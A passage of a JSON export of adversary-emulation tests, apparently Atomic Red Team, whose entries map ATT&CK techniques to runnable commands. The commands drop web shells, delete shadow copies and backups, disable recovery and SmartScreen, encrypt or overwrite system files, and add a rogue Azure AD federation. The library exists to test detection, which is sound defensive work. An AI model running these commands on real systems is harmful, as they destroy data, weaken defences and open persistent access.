windows\n\n"}, "executionSteps": [{"description": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n", "successCriteria": null}], "techniqueIds": ["clacwm6qw03rt29mq8mobf153", "clacwm2g500um29mq00elhy2w"], "tags": []}, {"data": {"name": "Web Shell Written to Disk", "shortName": "T1505.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates an adversary leveraging Web Shells by simulating the file modification to disk.\nIdea from APTSimulator.\ncmd.aspx source - https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | web_shell_path | The path to drop the web shell | String | C:\\inetpub\\wwwroot | \n | web_shells | Path of Web Shell | Path | PathToAtomicsFolder\\T1505.003\\src\\ | "}, "executionSteps": [{"description": "xcopy /I /Y #{web_shells} #{web_shell_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm664034h29mqcegs057n", "clacwm2m6010429mqg6hdc8qm"], "tags": []}, {"data": {"name": "Install MS Exchange Transport Agent Persistence", "shortName": "T1505.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | class_factory | Class factory of transport agent. | String | Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory | \n | dll_path | Path of DLL to use as transport agent. | Path | c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll | \n | transport_agent_identity | Friendly name of transport agent once installed. | String | Security Interop Agent | "}, "executionSteps": [{"description": "Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}\nEnable-TransportAgent #{transport_agent_identity}\nGet-TransportAgent | Format-List Name,Enabled\n", "successCriteria": null}], "techniqueIds": ["clacwm5yt02xi29mqeyzb9aqj", "clacwm2jw00xv29mq6oj8ddv0"], "tags": []}, {"data": {"name": "Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)", "shortName": "T1497.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"\n$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"\nif((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}\n", "successCriteria": null}], "techniqueIds": ["clacwm5vq02uz29mq4ay3bik5"], "tags": []}, {"data": {"name": "Detect Virtualization Environment (Windows)", "shortName": "T1497.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$error.clear()\nGet-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue\nif($error) {echo \"Virtualization Environment detected\"}\n", "successCriteria": null}], "techniqueIds": ["clacwm5vq02uz29mq4ay3bik5", "clacwm2hq00vy29mqcpn36fgz"], "tags": []}, {"data": {"name": "Detect Virtualization Environment (MacOS)", "shortName": "T1497.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.\n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\n", "successCriteria": null}], "techniqueIds": ["clacwm5vq02uz29mq4ay3bik5", "clacwm2hq00vy29mqcpn36fgz"], "tags": []}, {"data": {"name": "Detect Virtualization Environment (Linux)", "shortName": "T1497.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "systemd-detect-virt detects execution in a virtualized environment.\nAt boot, dmesg stores a log if a hypervisor is detected.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "if (systemd-detect-virt || sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;\n", "successCriteria": null}], "techniqueIds": ["clacwm5vq02uz29mq4ay3bik5", "clacwm2hq00vy29mqcpn36fgz"], "tags": []}, {"data": {"name": "macOS/Linux - Simulate CPU Load with Yes", "shortName": "T1496", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "yes > /dev/null\n", "successCriteria": null}], "techniqueIds": ["clacwm6nn03o829mq4fh2glo0", "clacwm2c200r529mq0rupev4b"], "tags": []}, {"data": {"name": "Replace Desktop Wallpaper", "shortName": "T1491.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Downloads an image from a URL and sets it as the desktop wallpaper.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | url_of_wallpaper | URL pointing to the image file you wish to set as wallpaper | Url | https://redcanary.com/wp-content/uploads/Atomic-Red-Team-Logo.png | \n | pointer_to_orginal_wallpaper | Full path to where a file containing the original wallpaper location will be saved | String | $env:TEMP\\T1491.001-OrginalWallpaperLocation | \n | wallpaper_location | Full path to where the downloaded wallpaper image will be saved | String | $env:TEMP\\T1491.001-newWallpaper.png | "}, "executionSteps": [{"description": "$url = \"#{url_of_wallpaper}\"\n$imgLocation = \"#{wallpaper_location}\"\n$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\\Control Panel\\Desktop\\' -Name WallPaper).WallPaper\n$orgWallpaper | Out-File -FilePath \"#{pointer_to_orginal_wallpaper}\"\n$updateWallpapercode = @' \nusing System.Runtime.InteropServices; \nnamespace Win32{\n\n    public class Wallpaper{ \n        [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] \n         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; \n         \n         public static void SetWallpaper(string thePath){ \n            SystemParametersInfo(20,0,thePath,3); \n        }\n    }\n} \n'@\n$wc = New-Object System.Net.WebClient  \ntry{  \n    $wc.DownloadFile($url, $imgLocation)\n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \ncatch [System.Net.WebException]{  \n    Write-Host(\"Cannot download $url\") \n    add-type $updateWallpapercode \n    [Win32.Wallpaper]::SetWallpaper($imgLocation)\n} \nfinally{    \n    $wc.Dispose()  \n}\n", "successCriteria": null}], "techniqueIds": ["clacwm6e103d629mqem0wb1xp", "clacwm1zg00hb29mq9xm8ganv"], "tags": []}, {"data": {"name": "Windows - wbadmin Delete Windows Backup Catalog", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,\n\"The backup catalog has been successfully deleted.\" will be displayed in the PowerShell session.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wbadmin delete catalog -quiet\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y", "clacwm1yz00gy29mq9o3yfa4b"], "tags": []}, {"data": {"name": "Windows - wbadmin Delete systemstatebackup", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Deletes the Windows systemstatebackup using wbadmin.exe. This technique is used by numerous ransomware families. This may only be successful on server platforms that have Windows Backup enabled.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wbadmin delete systemstatebackup -keepVersions:0\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y", "clacwm1yz00gy29mq9o3yfa4b"], "tags": []}, {"data": {"name": "Windows - Disable Windows Recovery Console Repair", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y", "clacwm1yz00gy29mq9o3yfa4b"], "tags": []}, {"data": {"name": "Windows - Disable the SR scheduled task", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "schtasks.exe /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y"], "tags": []}, {"data": {"name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y", "clacwm1yz00gy29mq9o3yfa4b"], "tags": []}, {"data": {"name": "Windows - Delete Volume Shadow Copies via WMI", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "wmic.exe shadowcopy delete\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y", "clacwm1yz00gy29mq9o3yfa4b"], "tags": []}, {"data": {"name": "Windows - Delete Volume Shadow Copies", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "vssadmin.exe delete shadows /all /quiet\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y", "clacwm1yz00gy29mq9o3yfa4b"], "tags": []}, {"data": {"name": "Windows - Delete Backup Files", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "del /s /f /q c:\\*.VHD c:\\*.bac c:\\*.bak c:\\*.wbcat c:\\*.bkf c:\\Backup*.* c:\\backup*.* c:\\*.set c:\\*.win c:\\*.dsk\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y", "clacwm1yz00gy29mq9o3yfa4b"], "tags": []}, {"data": {"name": "Disable System Restore Through Registry", "shortName": "T1490", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. \nSee how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6u403v929mqbzjc4d1y"], "tags": []}, {"data": {"name": "Windows - Stop service using Service Controller", "shortName": "T1489", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying\nit has changed to a state of STOP_PENDING. If the spooler service was not running \"The service has not been started.\" will be displayed and it can be\nstarted by running the cleanup command.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | service_name | Name of a service to stop | String | spooler | "}, "executionSteps": [{"description": "sc.exe stop #{service_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uk02th29mq6seu56dz", "clacwm2f100tj29mq9ko492pw"], "tags": []}, {"data": {"name": "Windows - Stop service using net.exe", "shortName": "T1489", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stops a specified service using the net.exe command. Upon execution, if the service was running \"The Print Spooler service was stopped successfully.\"\nwill be displayed. If the service was not running, \"The Print Spooler service is not started.\" will be displayed and it can be\nstarted by running the cleanup command.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | service_name | Name of a service to stop | String | spooler | "}, "executionSteps": [{"description": "net.exe stop #{service_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uk02th29mq6seu56dz", "clacwm2f100tj29mq9ko492pw"], "tags": []}, {"data": {"name": "Windows - Stop service by killing process", "shortName": "T1489", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stops a specified service killng the service's process.\nThis technique was used by WannaCry. Upon execution, if the spoolsv service was running \"SUCCESS: The process \"spoolsv.exe\" with PID 2316 has been terminated.\"\nwill be displayed. If the service was not running \"ERROR: The process \"spoolsv.exe\" not found.\" will be displayed and it can be\nstarted by running the cleanup command.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | process_name | Name of a process to kill | String | spoolsv.exe | "}, "executionSteps": [{"description": "taskkill.exe /f /im #{process_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm5uk02th29mq6seu56dz", "clacwm2f100tj29mq9ko492pw"], "tags": []}, {"data": {"name": "PureLocker Ransom Note", "shortName": "T1486", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "building the IOC (YOUR_FILES.txt) for the PureLocker ransomware \nhttps://www.bleepingcomputer.com/news/security/purelocker-ransomware-can-lock-files-on-windows-linux-and-macos/\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\Desktop\\YOUR_FILES.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm6jk03jo29mqcq28fowg"], "tags": []}, {"data": {"name": "Encrypt files using openssl (Linux)", "shortName": "T1486", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses openssl to encrypt a file\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | private_key_path | path to the private key | Path | /tmp/key.pem | \n | public_key_path | path to the public key | Path | /tmp/pub.pem | \n | encryption_bit_size | size of the bit of encryption | Integer | 2048 | \n | encrypted_file_path | path to the encrypted file | Path | /tmp/passwd.zip | \n | input_file_path | path to the file that you want to encrypt | Path | /etc/passwd | "}, "executionSteps": [{"description": "$which_openssl genrsa -out #{private_key_path} #{encryption_bit_size}\n$which_openssl rsa -in #{private_key_path} -pubout -out #{public_key_path}\n$which_openssl rsautl -encrypt -inkey #{public_key_path} -pubin -in #{input_file_path} -out #{encrypted_file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6jk03jo29mqcq28fowg"], "tags": []}, {"data": {"name": "Encrypt files using gpg (Linux)", "shortName": "T1486", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses gpg to encrypt a file\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | pwd_for_encrypted_file | the password that you want for the encrypted file | String | passwd | \n | encrypted_file_path | path to the encrypted file | Path | /tmp/passwd.gpg | \n | input_file_path | path to the file that you want to encrypt | Path | /etc/passwd | \n | encryption_alg | encryption algorithm of the file | String | AES-256 | "}, "executionSteps": [{"description": "echo \"#{pwd_for_encrypted_file}\" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6jk03jo29mqcq28fowg"], "tags": []}, {"data": {"name": "Encrypt files using ccrypt (Linux)", "shortName": "T1486", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cped_file_path | path where you want your copied file to be | Path | /tmp/passwd | \n | root_input_file_path | path to the file that you want to be encrypted if you are root user | Path | /etc/passwd | \n | user_input_file_path | path to file that you want to be encrypted if you are normal user | Path | ~/.bash_history | \n | impact_command | command to show impact of encryption | String | sudo su | "}, "executionSteps": [{"description": "if [[ $USER == \"root\" ]]; then $which_ccencrypt #{root_input_file_path}; file #{root_input_file_path}.cpt; #{impact_command}; else $which_ccencrypt #{user_input_file_path}; file #{user_input_file_path}.cpt; #{impact_command}; fi\n", "successCriteria": null}], "techniqueIds": ["clacwm6jk03jo29mqcq28fowg"], "tags": []}, {"data": {"name": "Encrypt files using 7z (Linux)", "shortName": "T1486", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses 7z to encrypt a file\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | pwd_for_encrypted_file | the password that you want for the encrypted file | String | passwd | \n | encrypted_file_path | path to the encrypted file | Path | /tmp/passwd.zip | \n | input_file_path | path to the file that you want to encrypt | Path | /etc/passwd | "}, "executionSteps": [{"description": "$which_7z a -p#{pwd_for_encrypted_file} #{encrypted_file_path} #{input_file_path}\n", "successCriteria": null}], "techniqueIds": ["clacwm6jk03jo29mqcq28fowg"], "tags": []}, {"data": {"name": "Windows - Overwrite file with Sysinternals SDelete", "shortName": "T1485", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | sdelete_exe | Path of sdelete executable | Path | $env:TEMP\\Sdelete\\sdelete.exe | \n | file_to_delete | Path of file to delete | Path | $env:TEMP\\T1485.txt | "}, "executionSteps": [{"description": "if (-not (Test-Path #{file_to_delete})) { New-Item #{file_to_delete} -Force }\nInvoke-Expression -Command \"#{sdelete_exe} -accepteula #{file_to_delete}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6p203pp29mqdc488qol", "clacwm1lw008e29mqgaa7ew78"], "tags": []}, {"data": {"name": "Overwrite deleted data on C drive", "shortName": "T1485", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "cipher.exe /w:C:\n", "successCriteria": null}], "techniqueIds": ["clacwm6p203pp29mqdc488qol"], "tags": []}, {"data": {"name": "macOS/Linux - Overwrite file with DD", "shortName": "T1485", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | overwrite_source | Path of data source to overwrite with | Path | /dev/zero | \n | file_to_overwrite | Path of file to overwrite and remove | Path | /var/log/syslog | "}, "executionSteps": [{"description": "dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes\n", "successCriteria": null}], "techniqueIds": ["clacwm6p203pp29mqdc488qol", "clacwm1lw008e29mqgaa7ew78"], "tags": []}, {"data": {"name": "Add Federation to Azure AD", "shortName": "T1484.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add a new federation to Azure AD using PowerShell. The malicious Identity Provider to be added must be configured beforehand.\nIf ADFS is used as IdP, the Uris parameters can be found at 'https://<federationservice>.<domainname>.com/federationmetadata/2007-06/federationmetadata.xml'\n\n\n**Supported Platforms:** azure-ad\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | azure_username | Username of a privileged Azure AD account such as External Identity Provider Administrator or Global Administrator roles | String | bruce.wayne@contosocloud.com | \n | azure_password | Password of azure_username | String | iamthebatman | \n | active_logon_uri | Active Logon Uri, available in federation metadata at <SingleSignOnService Binding=\"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST> field if ADFS is used. | String | https://sts.contoso.com/adfs/ls/ | \n | issuer_uri | Issuer Uri, available in federation metadata at the \"entityID\" field if ADFS is used. | String | http://sts.contoso.com/adfs/services/trust | \n | metadata_uri | Metadata exchange Uri, available in federation metadata at <Address xmlns=\"http://www.w3.org/2005/08/addressing\"> field if ADFS is used. | String | https://sts.contoso.com/adfs/services/trust/mex | \n | public_key | Public key of the X509 signing token certificate, in base64 | String | MzAgODIgMDEgMGEgMD...gZWQgOTkgMDIgMDMgMDEgMDAgMDE= | \n | domain_name | New federation domain name | String | contoso.com | "}, "executionSteps": [{"description": "Import-Module AzureADPreview\n$PWord = ConvertTo-SecureString -String \"#{azure_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{azure_username}\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n$federationSettings = New-Object Microsoft.Open.AzureAD.Model.DomainFederationSettings\n$federationSettings.ActiveLogOnUri = \"#{active_logon_uri}\"\n$federationSettings.IssuerUri = \"#{issuer_uri}\"\n$federationSettings.LogOffUri = $federationSettings.ActiveLogOnUri\n$federationSettings.MetadataExchangeUri = \"#{metadata_uri}\"\n$federationSettings.PassiveLogOnUri = $federationSettings.ActiveLogOnUri\n$federationSettings.PreferredAuthenticationProtocol = \"WsFed\"\n$federationSettings.SigningCertificate = \"#{public_key}\"\n$new = New-AzureADExternalDomainFederation -ExternalDomainName \"#{domain_name}\" -FederationSettings $federationSettings\nif ($new) { Write-Host \"`nFederation successfully added to Azure AD\" } else { Write-Host \"`nThe federation setup failed\" }\nGet-AzureADExternalDomainFederation -ExternalDomainName \"#{domain_name}\"\nWrite-Host \"End of federation configuration.\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5v602u929mqb6o68sqt"], "tags": []}, {"data": {"name": "LockBit Black - Modify Group policy settings -Powershell", "shortName": "T1484.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary modifies group policy settings\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm666034j29mqhi14a50m"], "tags": []}, {"data": {"name": "LockBit Black - Modify Group policy settings -cmd", "shortName": "T1484.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary can modify the group policy settings.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffsetDC /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTime /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v GroupPolicyRefreshTimeOffset /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v EnableSmartScreen /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" /v ShellSmartScreenLevel /t REG_SZ /d Block /f\n", "successCriteria": null}], "techniqueIds": ["clacwm666034j29mqhi14a50m"], "tags": []}, {"data": {"name": "Windows - Discover domain trusts with nltest", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "nltest /domain_trusts\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u", "clacwm1qb00b629mq9sltclhe"], "tags": []}, {"data": {"name": "Windows - Discover domain trusts with dsquery", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u", "clacwm1qb00b629mq9sltclhe"], "tags": []}, {"data": {"name": "TruffleSnout - Listing AD Infrastructure", "shortName": "T1482", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | trufflesnout_path | Path to the TruffleSnout executable | Path | PathToAtomicsFolder\\T1482\\src\\TruffleSnout.exe | \n | domain | Domain name to search on | String | %userdomain% | "}, "executionSteps": [{"description": "#{trufflesnout_path} forest -n #{domain}\n#{trufflesnout_path} domain -n #{domain}\n", "successCriteria": null}], "techniqueIds": ["clacwm6a7039329mq6q2ma79u"], 